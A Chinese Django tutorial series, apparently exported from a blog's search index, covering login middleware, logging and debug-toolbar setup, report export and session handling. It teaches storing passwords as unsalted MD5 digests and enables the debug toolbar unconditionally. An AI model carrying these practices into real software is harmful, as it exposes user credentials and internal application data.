在开发阶段，我们通常会使用Django自带的测试服务器，如果要尝试前后端分离，可以先将静态页面放在之前创建的放静态资源的目录下，具体的做法可以参考项目完整代码。","categories":[],"tags":[{"name":"前后端分离开发入门","slug":"前后端分离开发入门","permalink":"http://www.xiaocaibi.top/tags/%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/"}]},{"title":"47.中间件的应用","slug":"47-中间件的应用","date":"2021-06-06T13:10:21.000Z","updated":"2021-09-20T08:47:43.681Z","comments":true,"path":"posts/b91b4e58.html","link":"","permalink":"http://www.xiaocaibi.top/posts/b91b4e58.html","excerpt":"","text":"中间件的应用之前我们已经实现了用户必须登录才能投票的限制，但是一个新的问题来了。如果我们的应用中有很多功能都需要用户先登录才能执行，例如将前面导出Excel报表和查看统计图表的功能都做了必须登录才能访问的限制，那么我们是不是需要在每个视图函数中添加代码来检查session中是否包含userid的代码呢？答案是否定的，如果这样做了，我们的视图函数中必然会充斥着大量的重复代码。编程大师Martin Fowler曾经说过：代码有很多种坏味道，重复是最坏的一种。在Python程序中，我们可以通过装饰器来为函数提供额外的能力；在Django项目中，我们可以把类似于验证用户是否登录这样的重复性代码放到中间件中。 Django中间件概述中间件是安插在Web应用请求和响应过程之间的组件，它在整个Web应用中扮演了拦截过滤器的角色，通过中间件可以拦截请求和响应，并对请求和响应进行过滤（简单的说就是执行额外的处理）。通常，一个中间件组件只专注于完成一件特定的事，例如：Django框架通过SessionMiddleware中间件实现了对session的支持，又通过AuthenticationMiddleware中间件实现了基于session的请求认证。通过把多个中间件组合在一起，我们可以完成更为复杂的任务，Django框架就是这么做的。 Django项目的配置文件中就包含了对中间件的配置，代码如下所示。 MIDDLEWARE = [ 'django.middleware.security.SecurityMiddleware', 'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.common.CommonMiddleware', 'django.middleware.csrf.CsrfViewMiddleware', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware', ] 我们稍微为大家解释一下这些中间件的作用： CommonMiddleware - 基础设置中间件，可以处理以下一些配置参数。 DISALLOWED_USER_AGENTS - 不被允许的用户代理（浏览器） APPEND_SLASH - 是否追加/ USE_ETAG - 浏览器缓存相关 SecurityMiddleware - 安全相关中间件，可以处理和安全相关的配置项。 SECURE_HSTS_SECONDS - 强制使用HTTPS的时间 SECURE_HSTS_INCLUDE_SUBDOMAINS - HTTPS是否覆盖子域名 SECURE_CONTENT_TYPE_NOSNIFF - 是否允许浏览器推断内容类型 SECURE_BROWSER_XSS_FILTER - 是否启用跨站脚本攻击过滤器 SECURE_SSL_REDIRECT - 是否重定向到HTTPS连接 SECURE_REDIRECT_EXEMPT - 免除重定向到HTTPS SessionMiddleware - 会话中间件。 CsrfViewMiddleware - 通过生成令牌，防范跨请求份伪的造中间件。 XFrameOptionsMiddleware - 通过设置请求头参数，防范点击劫持攻击的中间件。 在请求的过程中，上面的中间件会按照书写的顺序从上到下执行，然后是URL解析，最后请求才会来到视图函数；在响应的过程中，上面的中间件会按照书写的顺序从下到上执行，与请求时中间件执行的顺序正好相反。 自定义中间件Django中的中间件有两种实现方式：基于类的实现方式和基于函数的实现方式，后者更接近于装饰器的写法。装饰器实际上是代理模式的应用，将横切关注功能（与正常业务逻辑没有必然联系的功能，例如：身份认证、日志记录、编码转换之类的功能）置于代理中，由代理对象来完成被代理对象的行为并添加额外的功能。中间件对用户请求和响应进行拦截过滤并增加额外的处理，在这一点上它跟装饰器是完全一致的，所以基于函数的写法来实现中间件就跟装饰器的写法几乎一模一样。下面我们用自定义的中间件来实现用户登录验证的功能。 \"\"\" middlewares.py \"\"\" from django.http import JsonResponse from django.shortcuts import redirect # 需要登录才能访问的资源路径 LOGIN_REQUIRED_URLS = {'/praise/', '/criticize/', '/excel/', '/teachers_data/'} def check_login_middleware(get_resp): def wrapper(request, *args, **kwargs): # 请求的资源路径在上面的集合中 if request.path in LOGIN_REQUIRED_URLS: # 会话中包含userid则视为已经登录 if 'userid' not in request.session: # 判断是不是Ajax请求 if request.is_ajax(): # Ajax请求返回JSON数据提示用户登录 return JsonResponse({'code': 10003, 'hint': '请先登录'}) else: backurl = request.get_full_path() # 非Ajax请求直接重定向到登录页 return redirect(f'/login/?backurl={backurl}') return get_resp(request, *args, **kwargs) return wrapper 当然，我们也可以定义一个类来充当装饰器，如果类中有__call__魔术方法，这个类的对象就像函数一样可调用，所以下面是另一种实现中间件的方式，道理跟上面的代码完全一样。 还有一种基于类实现中间件的方式，这种方式在较新版本的Django中已经不推荐使用了，但是大家接触到的代码中，仍然有可能遇到这种写法，大致的代码如下所示。 from django.utils.deprecation import MiddlewareMixin class MyMiddleware(MiddlewareMixin): def process_request(self, request): pass def process_view(self, request, view_func, view_args, view_kwargs): pass def process_template_response(self, request, response): pass def process_response(self, request, response): pass def process_exception(self, request, exception): pass 上面类中的五个方法都是中间件的钩子函数，分别在收到用户请求、进入视图函数之前、渲染模板、返回响应和出现异常的时候被回调。当然，写不写这些方法是根据中间件的需求来确定的，并不是所有的场景都需要重写五个方法，下面的图相信能够帮助大家理解这种写法。 写好中间件代码后，需要修改配置文件来激活中间件使其生效。 MIDDLEWARE = [ 'django.middleware.security.SecurityMiddleware', 'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.common.CommonMiddleware', 'django.middleware.csrf.CsrfViewMiddleware', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware', 'debug_toolbar.middleware.DebugToolbarMiddleware', 'vote.middlewares.check_login_middleware', ] 注意上面这个中间件列表中元素的顺序，当收到来自用户的请求时，中间件按照从上到下的顺序依次执行，这行完这些中间件以后，请求才会最终到达视图函数。当然，在这个过程中，用户的请求可以被拦截，就像上面我们自定义的中间件那样，如果用户在没有登录的情况下访问了受保护的资源，中间件会将请求直接重定向到登录页，后面的中间件和视图函数将不再执行。在响应用户请求的过程中，上面的中间件会按照从下到上的顺序依次执行，这样的话我们还可以对响应做进一步的处理。 中间件执行的顺序是非常重要的，对于有依赖关系的中间件必须保证被依赖的中间件要置于依赖它的中间件的前面，就好比我们刚才自定义的中间件要放到SessionMiddleware的后面，因为我们要依赖这个中间件为请求绑定的session对象才能判定用户是否登录。","categories":[],"tags":[{"name":"中间件的应用","slug":"中间件的应用","permalink":"http://www.xiaocaibi.top/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E5%BA%94%E7%94%A8/"}]},{"title":"46.日志和调试工具栏","slug":"46-日志和调试工具栏","date":"2021-06-04T06:09:56.000Z","updated":"2021-09-20T08:47:43.681Z","comments":true,"path":"posts/f920c3ce.html","link":"","permalink":"http://www.xiaocaibi.top/posts/f920c3ce.html","excerpt":"","text":"日志和调试工具栏配置日志项目开发阶段，显示足够的调试信息以辅助开发人员调试代码还是非常必要的；项目上线以后，将系统运行时出现的警告、错误等信息记录下来以备相关人员了解系统运行状况并维护代码也是很有必要的。与此同时，采集日志数据也是为网站做数字化运营奠定一个基础，通过对系统运行日志的分析，我们可以监测网站的流量以及流量分布，同时还可以挖掘出用户的使用习惯和行为模式。 接下来，我们先看看如何通过Django的配置文件来配置日志。Django的日志配置基本可以参照官方文档再结合项目实际需求来进行，这些内容基本上可以从官方文档上复制下来，然后进行局部的调整即可，下面给出一些参考配置。 LOGGING = { 'version': 1, # 是否禁用已经存在的日志器 'disable_existing_loggers': False, # 日志格式化器 'formatters': { 'simple': { 'format': '%(asctime)s %(module)s.%(funcName)s: %(message)s', 'datefmt': '%Y-%m-%d %H:%M:%S', }, 'verbose': { 'format': '%(asctime)s %(levelname)s [%(process)d-%(threadName)s] ' '%(module)s.%(funcName)s line %(lineno)d: %(message)s', 'datefmt': '%Y-%m-%d %H:%M:%S', } }, # 日志过滤器 'filters': { # 只有在Django配置文件中DEBUG值为True时才起作用 'require_debug_true': { '()': 'django.utils.log.RequireDebugTrue', }, }, # 日志处理器 'handlers': { # 输出到控制台 'console': { 'class': 'logging.StreamHandler', 'level': 'DEBUG', 'filters': ['require_debug_true'], 'formatter': 'simple', }, # 输出到文件(每周切割一次) 'file1': { 'class': 'logging.handlers.TimedRotatingFileHandler', 'filename': 'access.log', 'when': 'W0', 'backupCount': 12, 'formatter': 'simple', 'level': 'INFO', }, # 输出到文件(每天切割一次) 'file2': { 'class': 'logging.handlers.TimedRotatingFileHandler', 'filename': 'error.log', 'when': 'D', 'backupCount': 31, 'formatter': 'verbose', 'level': 'WARNING', }, }, # 日志器记录器 'loggers': { 'django': { # 需要使用的日志处理器 'handlers': ['console', 'file1', 'file2'], # 是否向上传播日志信息 'propagate': True, # 日志级别(不一定是最终的日志级别) 'level': 'DEBUG', }, } } 大家可能已经注意到了，上面日志配置中的formatters是日志格式化器，它代表了如何格式化输出日志，其中格式占位符分别表示： %(name)s - 记录器的名称 %(levelno)s - 数字形式的日志记录级别 %(levelname)s - 日志记录级别的文本名称 %(filename)s - 执行日志记录调用的源文件的文件名称 %(pathname)s - 执行日志记录调用的源文件的路径名称 %(funcName)s - 执行日志记录调用的函数名称 %(module)s - 执行日志记录调用的模块名称 %(lineno)s - 执行日志记录调用的行号 %(created)s - 执行日志记录的时间 %(asctime)s - 日期和时间 %(msecs)s - 毫秒部分 %(thread)d - 线程ID（整数） %(threadName)s - 线程名称 %(process)d - 进程ID （整数） 日志配置中的handlers用来指定日志处理器，简单的说就是指定将日志输出到控制台还是文件又或者是网络上的服务器，可用的处理器包括： logging.StreamHandler(stream=None) - 可以向类似与sys.stdout或者sys.stderr的任何文件对象输出信息 logging.FileHandler(filename, mode='a', encoding=None, delay=False) - 将日志消息写入文件 logging.handlers.DatagramHandler(host, port) - 使用UDP协议，将日志信息发送到指定主机和端口的网络主机上 logging.handlers.HTTPHandler(host, url) - 使用HTTP的GET或POST方法将日志消息上传到一台HTTP 服务器 logging.handlers.RotatingFileHandler(filename, mode='a', maxBytes=0, backupCount=0, encoding=None, delay=False) - 将日志消息写入文件，如果文件的大小超出maxBytes指定的值，那么将重新生成一个文件来记录日志 logging.handlers.SocketHandler(host, port) - 使用TCP协议，将日志信息发送到指定主机和端口的网络主机上 logging.handlers.SMTPHandler(mailhost, fromaddr, toaddrs, subject, credentials=None, secure=None, timeout=1.0) - 将日志输出到指定的邮件地址 logging.MemoryHandler(capacity, flushLevel=ERROR, target=None, flushOnClose=True) - 将日志输出到内存指定的缓冲区中 上面每个日志处理器都指定了一个名为level的属性，它代表了日志的级别，不同的日志级别反映出日志中记录信息的严重性。Python中定义了六个级别的日志，按照从低到高的顺序依次是：NOTSET、DEBUG、INFO、WARNING、ERROR、CRITICAL。 最后配置的日志记录器是用来真正输出日志的，Django框架提供了如下所示的内置记录器： django - 在Django层次结构中的所有消息记录器 django.request - 与请求处理相关的日志消息。5xx响应被视为错误消息；4xx响应被视为为警告消息 django.server - 与通过runserver调用的服务器所接收的请求相关的日志消息。5xx响应被视为错误消息；4xx响应被记录为警告消息；其他一切都被记录为INFO django.template - 与模板渲染相关的日志消息 django.db.backends - 有与数据库交互产生的日志消息，如果希望显示ORM框架执行的SQL语句，就可以使用该日志记录器。 日志记录器中配置的日志级别有可能不是最终的日志级别，因为还要参考日志处理器中配置的日志级别，取二者中级别较高者作为最终的日志级别。 配置Django-Debug-Toolbar如果想调试你的Django项目，你一定不能不过名为Django-Debug-Toolbar的神器，它是项目开发阶段辅助调试和优化的必备工具，只要配置了它，就可以很方便的查看到如下表所示的项目运行信息，这些信息对调试项目和优化Web应用性能都是至关重要的。 项目 说明 Versions Django的版本 Time 显示视图耗费的时间 Settings 配置文件中设置的值 Headers HTTP请求头和响应头的信息 Request 和请求相关的各种变量及其信息 StaticFiles 静态文件加载情况 Templates 模板的相关信息 Cache 缓存的使用情况 Signals Django内置的信号信息 Logging 被记录的日志信息 SQL 向数据库发送的SQL语句及其执行时间 安装Django-Debug-Toolbar。 pip install django-debug-toolbar 配置 - 修改settings.py。 INSTALLED_APPS = [ 'debug_toolbar', ] MIDDLEWARE = [ 'debug_toolbar.middleware.DebugToolbarMiddleware', ] DEBUG_TOOLBAR_CONFIG = { # 引入jQuery库 'JQUERY_URL': 'https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js', # 工具栏是否折叠 'SHOW_COLLAPSED': True, # 是否显示工具栏 'SHOW_TOOLBAR_CALLBACK': lambda x: True, } 配置 - 修改urls.py。 if settings.DEBUG: import debug_toolbar urlpatterns.insert(0, path('__debug__/', include(debug_toolbar.urls))) 在配置好Django-Debug-Toolbar之后，页面右侧会看到一个调试工具栏，如下图所示，上面包括了如前所述的各种调试信息，包括执行时间、项目设置、请求头、SQL、静态资源、模板、缓存、信号等，查看起来非常的方便。 优化ORM代码在配置了日志或Django-Debug-Toolbar之后，我们可以查看一下之前将老师数据导出成Excel报表的视图函数执行情况，这里我们关注的是ORM框架生成的SQL查询到底是什么样子的，相信这里的结果会让你感到有一些意外。执行Teacher.objects.all()之后我们可以注意到，在控制台看到的或者通过Django-Debug-Toolbar输出的SQL是下面这样的： SELECT `tb_teacher`.`no`, `tb_teacher`.`name`, `tb_teacher`.`detail`, `tb_teacher`.`photo`, `tb_teacher`.`good_count`, `tb_teacher`.`bad_count`, `tb_teacher`.`sno` FROM `tb_teacher`; args=() SELECT `tb_subject`.`no`, `tb_subject`.`name`, `tb_subject`.`intro`, `tb_subject`.`create_date`, `tb_subject`.`is_hot` FROM `tb_subject` WHERE `tb_subject`.`no` = 101; args=(101,) SELECT `tb_subject`.`no`, `tb_subject`.`name`, `tb_subject`.`intro`, `tb_subject`.`create_date`, `tb_subject`.`is_hot` FROM `tb_subject` WHERE `tb_subject`.`no` = 101; args=(101,) SELECT `tb_subject`.`no`, `tb_subject`.`name`, `tb_subject`.`intro`, `tb_subject`.`create_date`, `tb_subject`.`is_hot` FROM `tb_subject` WHERE `tb_subject`.`no` = 101; args=(101,) SELECT `tb_subject`.`no`, `tb_subject`.`name`, `tb_subject`.`intro`, `tb_subject`.`create_date`, `tb_subject`.`is_hot` FROM `tb_subject` WHERE `tb_subject`.`no` = 101; args=(101,) SELECT `tb_subject`.`no`, `tb_subject`.`name`, `tb_subject`.`intro`, `tb_subject`.`create_date`, `tb_subject`.`is_hot` FROM `tb_subject` WHERE `tb_subject`.`no` = 103; args=(103,) SELECT `tb_subject`.`no`, `tb_subject`.`name`, `tb_subject`.`intro`, `tb_subject`.`create_date`, `tb_subject`.`is_hot` FROM `tb_subject` WHERE `tb_subject`.`no` = 103; args=(103,) 这里的问题通常被称为“1+N查询”（有的地方也将其称之为“N+1查询”），原本获取老师的数据只需要一条SQL，但是由于老师关联了学科，当我们查询到N条老师的数据时，Django的ORM框架又向数据库发出了N条SQL去查询老师所属学科的信息。每条SQL执行都会有较大的开销而且会给数据库服务器带来压力，如果能够在一条SQL中完成老师和学科的查询肯定是更好的做法，这一点也很容易做到，相信大家已经想到怎么做了。是的，我们可以使用连接查询，但是在使用Django的ORM框架时如何做到这一点呢？对于多对一关联（如投票应用中的老师和学科），我们可以使用QuerySet的用select_related()方法来加载关联对象；而对于多对多关联（如电商网站中的订单和商品），我们可以使用prefetch_related()方法来加载关联对象。 在导出老师Excel报表的视图函数中，我们可以按照下面的方式优化代码。 queryset = Teacher.objects.all().select_related('subject') 事实上，用ECharts生成前端报表的视图函数中，查询老师好评和差评数据的操作也能够优化，因为在这个例子中，我们只需要获取老师的姓名、好评数和差评数这三项数据，但是在默认的情况生成的SQL会查询老师表的所有字段。可以用QuerySet的only()方法来指定需要查询的属性，也可以用QuerySet的defer()方法来指定暂时不需要查询的属性，这样生成的SQL会通过投影操作来指定需要查询的列，从而改善查询性能，代码如下所示： queryset = Teacher.objects.all().only('name', 'good_count', 'bad_count') 当然，如果要统计出每个学科的老师好评和差评的平均数，利用Django的ORM框架也能够做到，代码如下所示： queryset = Teacher.objects.values('subject').annotate(good=Avg('good_count'), bad=Avg('bad_count')) 这里获得的QuerySet中的元素是字典对象，每个字典中有三组键值对，分别是代表学科编号的subject、代表好评数的good和代表差评数的bad。如果想要获得学科的名称而不是编号，可以按照如下所示的方式调整代码： queryset = Teacher.objects.values('subject__name').annotate(good=Avg('good_count'), bad=Avg('bad_count')) 可见，Django的ORM框架允许我们用面向对象的方式完成关系数据库中的分组和聚合查询。","categories":[],"tags":[{"name":"日志和调试工具栏","slug":"日志和调试工具栏","permalink":"http://www.xiaocaibi.top/tags/%E6%97%A5%E5%BF%97%E5%92%8C%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7%E6%A0%8F/"}]},{"title":"45.制作报表","slug":"45-制作报表","date":"2021-06-01T02:09:24.000Z","updated":"2021-09-20T08:47:43.681Z","comments":true,"path":"posts/e24660bd.html","link":"","permalink":"http://www.xiaocaibi.top/posts/e24660bd.html","excerpt":"","text":"制作报表导出Excel报表报表就是用表格、图表等格式来动态显示数据，所以有人用这样的公式来描述报表： 报表 = 多样的格式 + 动态的数据 有很多的三方库支持在Python程序中写Excel文件，包括xlwt、xlwings、openpyxl、xlswriter等，其中的xlwt虽然只支持写xls格式的Excel文件，但在性能方面的表现还是不错的。下面我们就以xlwt为例，来演示如何在Django项目中导出Excel报表。 安装xlwt。 pip install xlwt 导出包含所有老师信息的Excel表格的视图函数。 def export_teachers_excel(request): # 创建工作簿 wb = xlwt.Workbook() # 添加工作表 sheet = wb.add_sheet('老师信息表') # 查询所有老师的信息 queryset = Teacher.objects.all() # 向Excel表单中写入表头 colnames = ('姓名', '介绍', '好评数', '差评数', '学科') for index, name in enumerate(colnames): sheet.write(0, index, name) # 向单元格中写入老师的数据 props = ('name', 'detail', 'good_count', 'bad_count', 'subject') for row, teacher in enumerate(queryset): for col, prop in enumerate(props): value = getattr(teacher, prop, '') if isinstance(value, Subject): value = value.name sheet.write(row + 1, col, value) # 保存Excel buffer = BytesIO() wb.save(buffer) # 将二进制数据写入响应的消息体中并设置MIME类型 resp = HttpResponse(buffer.getvalue(), content_type='application/vnd.ms-excel') # 中文文件名需要处理成百分号编码 filename = quote('老师.xls') # 通过响应头告知浏览器下载该文件以及对应的文件名 resp['content-disposition'] = f'attachment; filename*=utf-8\\'\\'{filename}' return resp 映射URL。 urlpatterns = [ path('excel/', views.export_teachers_excel), ] 导出PDF报表在Django项目中，如果需要导出PDF报表，可以借助三方库reportlab来生成PDF文件的内容，再将文件的二进制数据输出给浏览器并指定MIME类型为application/pdf，具体的代码如下所示。 def export_pdf(request: HttpRequest) -&gt; HttpResponse: buffer = io.BytesIO() pdf = canvas.Canvas(buffer) pdf.setFont(\"Helvetica\", 80) pdf.setFillColorRGB(0.2, 0.5, 0.3) pdf.drawString(100, 550, 'hello, world!') pdf.showPage() pdf.save() resp = HttpResponse(buffer.getvalue(), content_type='application/pdf') resp['content-disposition'] = 'inline; filename=\"demo.pdf\"' return resp 关于如何用reportlab定制PDF报表的内容，可以参考reportlab的官方文档。 生成前端统计图表如果项目中需要生成前端统计图表，可以使用百度的ECharts。具体的做法是后端通过提供数据接口返回统计图表所需的数据，前端使用ECharts来渲染出柱状图、折线图、饼图、散点图等图表。例如我们要生成一个统计所有老师好评数和差评数的报表，可以按照下面的方式来做。 def get_teachers_data(request): queryset = Teacher.objects.all() names = [teacher.name for teacher in queryset] good_counts = [teacher.good_count for teacher in queryset] bad_counts = [teacher.bad_count for teacher in queryset] return JsonResponse({'names': names, 'good': good_counts, 'bad': bad_counts}) 映射URL。 urlpatterns = [ path('teachers_data/', views.get_teachers_data), ] 使用ECharts生成柱状图。 &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;老师评价统计&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"main\" style=\"width: 600px; height: 400px\"&gt;&lt;/div&gt; &lt;p&gt; &lt;a href=\"/\"&gt;返回首页&lt;/a&gt; &lt;/p&gt; &lt;script src=\"https://cdn.bootcss.com/echarts/4.2.1-rc1/echarts.min.js\"&gt;&lt;/script&gt; &lt;script&gt; var myChart = echarts.init(document.querySelector('#main')) fetch('/teachers_data/') .then(resp =&gt; resp.json()) .then(json =&gt; { var option = { color: ['#f00', '#00f'], title: { text: '老师评价统计图' }, tooltip: {}, legend: { data:['好评', '差评'] }, xAxis: { data: json.names }, yAxis: {}, series: [ { name: '好评', type: 'bar', data: json.good }, { name: '差评', type: 'bar', data: json.bad } ] } myChart.setOption(option) }) &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 运行效果如下图所示。","categories":[],"tags":[{"name":"制作报表","slug":"制作报表","permalink":"http://www.xiaocaibi.top/tags/%E5%88%B6%E4%BD%9C%E6%8A%A5%E8%A1%A8/"}]},{"title":"44.Cookie和Session","slug":"44-Cookie和Session","date":"2021-05-31T09:09:00.000Z","updated":"2021-09-20T08:47:43.916Z","comments":true,"path":"posts/14ce8948.html","link":"","permalink":"http://www.xiaocaibi.top/posts/14ce8948.html","excerpt":"","text":"Cookie和Session我们继续来完成上一章节中的项目，实现“用户登录”的功能，并限制只有登录的用户才能投票。 用户登录的准备工作我们先为实现用户登录做一些准备工作。 创建用户模型。之前我们讲解过如果通过Django的ORM实现从二维表到模型的转换（反向工程），这次我们尝试把模型变成二维表（正向工程）。 class User(models.Model): \"\"\"用户\"\"\" no = models.AutoField(primary_key=True, verbose_name='编号') username = models.CharField(max_length=20, unique=True, verbose_name='用户名') password = models.CharField(max_length=32, verbose_name='密码') tel = models.CharField(max_length=20, verbose_name='手机号') reg_date = models.DateTimeField(auto_now_add=True, verbose_name='注册时间') last_visit = models.DateTimeField(null=True, verbose_name='最后登录时间') class Meta: db_table = 'tb_user' verbose_name = '用户' verbose_name_plural = '用户' 使用下面的命令生成迁移文件并执行迁移，将User模型直接变成关系型数据库中的二维表tb_user。 python manage.py makemigrations polls python manage.py migrate polls 用下面的SQL语句直接插入两条测试数据，通常不能讲用户的密码直接保存在数据库中，因此我们将用户密码处理成对应的MD5摘要。MD5消息摘要算法是一种被广泛使用的密码哈希函数（散列函数），可以产生出一个128位（比特）的哈希值（散列值），用于确保信息传输完整一致。在使用哈希值时，通常会将哈希值表示为16进制字符串，因此128位的MD5摘要通常表示为32个十六进制符号。 insert into `tb_user` (`username`, `password`, `tel`, `reg_date`) values ('wangdachui', '1c63129ae9db9c60c3e8aa94d3e00495', '13122334455', now()), ('hellokitty', 'c6f8cf68e5f68b0aa4680e089ee4742c', '13890006789', now()); 说明：上面创建的两个用户wangdachui和hellokitty密码分别是1qaz2wsx和Abc123!!。 我们在应用下增加一个名为utils.py的模块用来保存需要使用的工具函数。Python标准库中的hashlib模块封装了常用的哈希算法，包括：MD5、SHA1、SHA256等。下面是使用hashlib中的md5类将字符串处理成MD5摘要的函数如下所示。 import hashlib def gen_md5_digest(content): return hashlib.md5(content.encode()).hexdigest() 编写用户登录的视图函数和模板页。 添加渲染登录页面的视图函数： def login(request: HttpRequest) -&gt; HttpResponse: hint = '' return render(request, 'login.html', {'hint': hint}) 增加login.html模板页： &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;用户登录&lt;/title&gt; &lt;style&gt; #container { width: 520px; margin: 10px auto; } .input { margin: 20px 0; width: 460px; height: 40px; } .input&gt;label { display: inline-block; width: 140px; text-align: right; } .input&gt;img { width: 150px; vertical-align: middle; } input[name=captcha] { vertical-align: middle; } form+div { margin-top: 20px; } form+div&gt;a { text-decoration: none; color: darkcyan; font-size: 1.2em; } .button { width: 500px; text-align: center; margin-top: 20px; } .hint { color: red; font-size: 12px; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"container\"&gt; &lt;h1&gt;用户登录&lt;/h1&gt; &lt;hr&gt; &lt;p class=\"hint\"&gt;{{ hint }}&lt;/p&gt; &lt;form action=\"/login/\" method=\"post\"&gt; {% csrf_token %} &lt;fieldset&gt; &lt;legend&gt;用户信息&lt;/legend&gt; &lt;div class=\"input\"&gt; &lt;label&gt;用户名：&lt;/label&gt; &lt;input type=\"text\" name=\"username\"&gt; &lt;/div&gt; &lt;div class=\"input\"&gt; &lt;label&gt;密码：&lt;/label&gt; &lt;input type=\"password\" name=\"password\"&gt; &lt;/div&gt; &lt;div class=\"input\"&gt; &lt;label&gt;验证码：&lt;/label&gt; &lt;input type=\"text\" name=\"captcha\"&gt; &lt;img id=\"code\" src=\"/captcha/\" alt=\"\" width=\"150\" height=\"40\"&gt; &lt;/div&gt; &lt;/fieldset&gt; &lt;div class=\"button\"&gt; &lt;input type=\"submit\" value=\"登录\"&gt; &lt;input type=\"reset\" value=\"重置\"&gt; &lt;/div&gt; &lt;/form&gt; &lt;div&gt; &lt;a href=\"/\"&gt;返回首页&lt;/a&gt; &lt;a href=\"/register/\"&gt;注册新用户&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 注意，在上面的表单中，我们使用了模板指令{% csrf_token %}为表单添加一个隐藏域（大家可以在浏览器中显示网页源代码就可以看到这个指令生成的type属性为hidden的input标签），它的作用是在表单中生成一个随机令牌（token）来防范跨站请求伪造（简称为CSRF），这也是Django在提交表单时的硬性要求。如果我们的表单中没有这样的令牌，那么提交表单时，Django框架会产生一个响应状态码为403的响应（禁止访问），除非我们设置了免除CSRF令牌。下图是一个关于CSRF简单生动的例子。 接下来，我们可以编写提供验证码和实现用户登录的视图函数，在此之前，我们先说说一个Web应用实现用户跟踪的方式以及Django框架对实现用户跟踪所提供的支持。对一个Web应用来说，用户登录成功后必然要让服务器能够记住该用户已经登录，这样服务器才能为这个用户提供更好的服务，而且上面说到的CSRF也是通过钓鱼网站来套取用户登录信息进行恶意操作的攻击手段，这些都是以用户跟踪技术为基础的。在理解了这些背景知识后，我们就清楚用户登录时到底需要执行哪些操作。 实现用户跟踪如今，一个网站如果不通过某种方式记住你是谁以及你之前在网站的活动情况，失去的就是网站的可用性和便利性，继而很有可能导致网站用户的流式，所以记住一个用户（更专业的说法叫用户跟踪）对绝大多数Web应用来说都是必需的功能。 在服务器端，我们想记住一个用户最简单的办法就是创建一个对象，通过这个对象就可以把用户相关的信息都保存起来，这个对象就是我们常说的session（用户会话对象）。那么问题来了，HTTP本身是一个无连接（每次请求和响应的过程中，服务器一旦完成对客户端请求的响应之后就断开连接）、无状态（客户端再次发起对服务器的请求时，服务器无法得知这个客户端之前的任何信息）的协议，即便服务器通过session对象保留了用户数据，还得通过某种方式来确定当前的请求与之前保存过的哪一个session是有关联的。相信很多人都能想到，我们可以给每个session对象分配一个全局唯一的标识符来识别session对象，我们姑且称之为sessionid，每次客户端发起请求时，只要携带上这个sessionid，就有办法找到与之对应的session对象，从而实现在两次请求之间记住该用户的信息，也就是我们之前说的用户跟踪。 要让客户端记住并在每次请求时带上sessionid又有以下几种做法： URL重写。所谓URL重写就是在URL中携带sessionid，例如：http://www.example.com/index.html?sessionid=123456，服务器通过获取sessionid参数的值来取到与之对应的session对象。 隐藏域（隐式表单域）。在提交表单的时候，可以通过在表单中设置隐藏域向服务器发送额外的数据。例如：&lt;input type=\"hidden\" name=\"sessionid\" value=\"123456\"&gt;。 本地存储。现在的浏览器都支持多种本地存储方案，包括：cookie、localStorage、sessionStorage、IndexedDB等。在这些方案中，cookie是历史最为悠久也是被诟病得最多的一种方案，也是我们接下来首先为大家讲解的一种方案。简单的说，cookie是一种以键值对方式保存在浏览器临时文件中的数据，每次请求时，请求头中会携带本站点的cookie到服务器，那么只要将sessionid写入cookie，下次请求时服务器只要读取请求头中的cookie就能够获得这个sessionid，如下图所示。 在HTML5时代要，除了cookie，还可以使用新的本地存储API来保存数据，就是刚才提到的localStorage、sessionStorage、IndexedDB等技术，如下图所示。 总结一下，要实现用户跟踪，服务器端可以为每个用户会话创建一个session对象并将session对象的ID写入到浏览器的cookie中；用户下次请求服务器时，浏览器会在HTTP请求头中携带该网站保存的cookie信息，这样服务器就可以从cookie中找到session对象的ID并根据此ID获取到之前创建的session对象；由于session对象可以用键值对的方式保存用户数据，这样之前保存在session对象中的信息可以悉数取出，服务器也可以根据这些信息判定用户身份和了解用户偏好，为用户提供更好的个性化服务。 Django框架对session的支持在创建Django项目时，默认的配置文件settings.py文件中已经激活了一个名为SessionMiddleware的中间件（关于中间件的知识我们在后面的章节做详细讲解，这里只需要知道它的存在即可），因为这个中间件的存在，我们可以直接通过请求对象的session属性来操作会话对象。前面我们说过，session属性是一个像字典一样可以读写数据的容器对象，因此我们可以使用“键值对”的方式来保留用户数据。与此同时，SessionMiddleware中间件还封装了对cookie的操作，在cookie中保存了sessionid，这一点我们在上面已经提到过了。 在默认情况下，Django将session的数据序列化后保存在关系型数据库中，在Django 1.6以后的版本中，默认的序列化数据的方式是JSON序列化，而在此之前一直使用Pickle序列化。JSON序列化和Pickle序列化的差别在于前者将对象序列化为字符串（字符形式），而后者将对象序列化为字节串（二进制形式），因为安全方面的原因，JSON序列化成为了目前Django框架默认序列化数据的方式，这就要求在我们保存在session中的数据必须是能够JSON序列化的，否则就会引发异常。还有一点需要说明的是，使用关系型数据库保存session中的数据在大多数时候并不是最好的选择，因为数据库可能会承受巨大的压力而成为系统性能的瓶颈，在后面的章节中我们会告诉大家如何将session保存到缓存服务中以提升系统的性能。 实现用户登录验证首先，我们在刚才的polls/utils.py文件中编写生成随机验证码的函数gen_random_code，内容如下所示。 import random ALL_CHARS = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' def gen_random_code(length=4): return 